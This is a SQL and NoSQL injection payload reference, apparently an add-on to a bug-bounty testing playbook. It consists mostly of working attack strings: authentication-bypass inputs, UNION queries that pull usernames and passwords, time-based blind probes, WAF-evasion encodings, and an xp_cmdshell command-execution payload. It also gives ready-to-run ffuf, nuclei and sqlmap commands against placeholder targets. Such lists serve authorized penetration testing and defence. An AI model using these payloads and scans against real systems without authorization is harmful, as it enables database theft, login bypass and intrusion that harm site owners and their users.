# SQLi — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Boolean -> `' AND 1=1-- -` `' AND 1=2-- -`

- Time -> `'; SELECT pg_sleep(5)-- -` `' AND SLEEP(5)-- -` `'; WAITFOR DELAY '0:0:5'--`

- Union -> `' UNION SELECT NULL,version(),user()-- -`

- NoSQL -> `{"$ne":null}` `{"$gt":""}` `{"$regex":"^a"}`

- Header -> inject in User-Agent, Referer, X-Forwarded-For, Cookie



## Payload bank



**84 curated payloads** in 6 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### Detection & authentication bypass



```text

'

"

')

';

\

' AND 1=1-- -

' AND 1=2-- -

' OR '1'='1

' OR 1=1-- -

" OR "1"="1

' OR '1'='1' --

' OR 1=1#

') OR ('1'='1

'||'1'='1

' AND 'x'='x

admin'--

admin'#

admin'/*

' OR 1=1 LIMIT 1-- -

```



### UNION / error-based



```text

' ORDER BY 1-- -

' ORDER BY 100-- -

' UNION SELECT NULL-- -

' UNION SELECT NULL,NULL-- -

' UNION SELECT NULL,NULL,NULL-- -

' UNION SELECT 1,2,3-- -

-1 UNION SELECT 1,2,3-- -

' UNION ALL SELECT NULL,version(),user()-- -

' UNION SELECT table_name,NULL FROM information_schema.tables-- -

' UNION SELECT username,password FROM users-- -

' AND extractvalue(1,concat(0x7e,version()))-- -

' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -

' AND 1=CAST((SELECT version()) AS int)-- -

' AND (SELECT * FROM (SELECT NAME_CONST(version(),1))a)-- -

' AND 1=(SELECT COUNT(*) FROM information_schema.tables)-- -

```



### Time-based blind



```text

' AND SLEEP(5)-- -

' OR SLEEP(5)-- -

'; SELECT SLEEP(5)-- -

' AND (SELECT 5 FROM (SELECT(SLEEP(5)))a)-- -

' AND BENCHMARK(5000000,MD5(1))-- -

'; WAITFOR DELAY '0:0:5'-- -

'; IF (1=1) WAITFOR DELAY '0:0:5'-- -

' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -

'; SELECT pg_sleep(5)-- -

'||pg_sleep(5)-- -

' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -

1;SELECT PG_SLEEP(5)--

' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))-- -

```



### NoSQL / operator injection



```text

{"$ne": null}

{"$gt": ""}

{"$regex": "^a"}

{"$where": "sleep(5000)"}

{"username": {"$ne": null}, "password": {"$ne": null}}

{"$or": [{"user": "admin"}, {"user": {"$ne": null}}]}

username[$ne]=x&password[$ne]=x

username[$regex]=^adm&password[$ne]=x

{"username": {"$in": ["admin", "root"]}, "password": {"$ne": "x"}}

{"password": {"$exists": true}}

```



### WAF & filter bypass



```text

'/**/AND/**/1=1-- -

'%09AND%091=1-- -

'%0aAND%0a1=1-- -

'/*!50000AND*/1=1-- -

' UnIoN SeLeCt 1,2,3-- -

' UNION/**/SELECT/**/1,2,3-- -

' UNION%0ASELECT%0A1,2,3-- -

'+UNION+SELECT+1,2,3--+-

'||(SELECT '1')||'

' AND 1=1 AND '1'='1

'/**/OR/**/'1'='1

' %0bOR %0b'1'='1

' AND 0x31=0x31-- -

' AND CHAR(49)=CHAR(49)-- -

' AND ASCII('A')=65-- -

' UNION SELECT 1,2,3 FROM dual-- -

' AND (SELECT 1)=(SELECT 1)-- -

```



### JSON, header & second-order points



```text

{"id": "1 OR 1=1"}

{"sort": "id; SELECT pg_sleep(5)"}

{"filter": {"$where": "this.a == this.a"}}

X-Forwarded-For: 127.0.0.1' OR 1=1-- -

User-Agent: ' OR SLEEP(5)-- -

Referer: ' AND 1=1-- -

Cookie: session=' OR 1=1-- -

id=1&id=2' OR '1'='1

id[]=1' OR '1'='1

id=1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_sqli.txt` (84)

- `~/.local/share/hackerone-reports/wordlists/payloads_sqli_waf.txt` (17 filter/WAF-focused)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 4× | `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}` |

| 3× | `poc*/; SELECT '<INJECTION:DUMP_TRIGGER>'; /*` |

| 2× | `https://intensedebate.com/commenthistory/$YourSiteId` |

| 2× | `by Abusing LocalParams (` |

| 2× | `) in` |

| 2× | `. $table_name_layers .` |

| 2× | `securitylab@github.com` |

| 2× | `@@LANGID` |

| 2× | `__proto__` |

| 2× | `{"text":"a","title":{"__proto__":{"where":{"name":"sqlinjection","where":null}}}}` |

| 2× | `$regex` |

| 2× | `$limit` |

| 2× | `$order` |

| 2× | `$type` |

| 2× | `$where` |

| 2× | `$serendipity['fetchLimit']` |

| 2× | `MADB_DynStrGetWhere()` |

| 1× | `<MainAccount>123456</MainAccount>` |

| 1× | `<MainAccount>123456'</MainAccount>` |

| 1× | `<MainAccount>123456&apos;</MainAccount>` |



## Parameters observed



`hash` · `data` · `alert` · `content` · `_pageLabel` · `pwd` · `id` · `scn` · `Submit` · `page` · `searchText` · `username` · `check20` · `rcnum` · `acctid` · `jsontree` · `site_id` · `group_id` · `type` · `template`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_sqli.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_sqli.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/payloads_sqli.txt` | 84 |

| `~/.local/share/hackerone-reports/wordlists/payloads_sqli_waf.txt` | 17 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_sqli.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_sqli.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_sqli.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



DAST SQLi templates fuzz parameters; confirm with manual boolean/time payloads before reporting.



```sh

nuclei -u https://target -tags sqli,time-based-sqli \

       -severity low,medium,high,critical -rl 40 -o nuclei_sqli.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/sqli -dast \

       -rl 40 -o nuclei_sqli_sqli.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \

       -rl 40 -o nuclei_sqli_generic.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



**Initial Error-Based Probes:**

```sql

'

''

`

')

"))

' OR '1'='1

' OR 1=1--

" OR 1=1--

' OR 1=1#

admin'--

```



**Boolean-Based Blind:**

```sql

' AND 1=1--   (true condition)

' AND 1=2--   (false condition)

' AND SUBSTRING(version(),1,1)='5'--

1 AND (SELECT COUNT(*) FROM users) > 0--

```



**Time-Based Blind:**

```sql

-- MySQL

' AND SLEEP(5)--

1; SELECT SLEEP(5)--



-- PostgreSQL  

'; SELECT pg_sleep(5)--

1 AND (SELECT 1 FROM pg_sleep(5))--



-- MSSQL

'; WAITFOR DELAY '0:0:5'--

1; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--



-- SQLite

' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))))==1--

```



**UNION-Based (enumerate columns first):**

```sql

' ORDER BY 1--

' ORDER BY 2--

' ORDER BY 10--   (find column count via error)

' UNION SELECT NULL--

' UNION SELECT NULL,NULL--

' UNION SELECT NULL,NULL,NULL--

' UNION SELECT 1,database(),3--

' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--

```



**NoSQL Injection (MongoDB):**

```javascript

// JSON body injection

{"username": {"$gt": ""}, "password": {"$gt": ""}}

{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

{"$where": "this.username == this.password"}



// Query string injection

username[$ne]=invalid&password[$ne]=invalid

username[$regex]=.*&password[$regex]=.*

```



**PHP Hash/Array Injection:**

```

# Replace scalar with array

param[key]=value

param[$gt]=0

param[$ne]=null

```



**Grep patterns for JS source hunting:**

```bash

# Find unsanitized query construction in JS

grep -r "query\s*+=" src/

grep -r "WHERE.*\+" src/

grep -r "\.find({" src/ | grep -v "sanitize\|escape"

grep -rE "db\.query\(.*\+" src/

```



**curl time-based detection:**

```bash

# Baseline

curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test"



# Inject

curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test' AND SLEEP(5)--"



# SQLMap quick scan

sqlmap -u "https://target.com/search?q=test" --dbs --level=3 --risk=2 --batch



# SQLMap with POST

sqlmap -u "https://target.com/api/filter" --data="category=electronics&sort=price" --dbs --batch



# SQLMap with cookie auth

sqlmap -u "https://target.com/admin/report" --cookie="session=TOKEN" --dbs --batch --level=5

```



**Burp Intruder payload list for column enumeration:**

```

§1§

§1§,§1§

§1§,§1§,§1§

§1§,§1§,§1§,§1§

```



---
